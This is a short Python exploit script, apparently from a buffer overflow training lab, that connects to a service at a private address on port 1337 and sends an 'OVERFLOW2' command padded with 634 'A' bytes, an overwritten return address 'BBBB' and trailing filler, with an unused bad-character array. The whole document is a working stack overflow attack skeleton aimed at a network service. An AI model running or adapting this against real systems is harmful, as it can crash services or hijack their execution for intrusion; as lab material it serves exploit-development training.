#!/usr/bin/env python3

import socket, struct
host, port = '10.10.100.108', 1337
command = b'OVERFLOW2 '
offset = 634
length = 1000
new_eip = b'BBBB'
all_chars = bytearray(range(1,256))

payload = b''.join(
        [
        command,
        b'A' * offset,
        new_eip,
        b'C' * (length - len(new_eip) - offset),
        ])

with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)
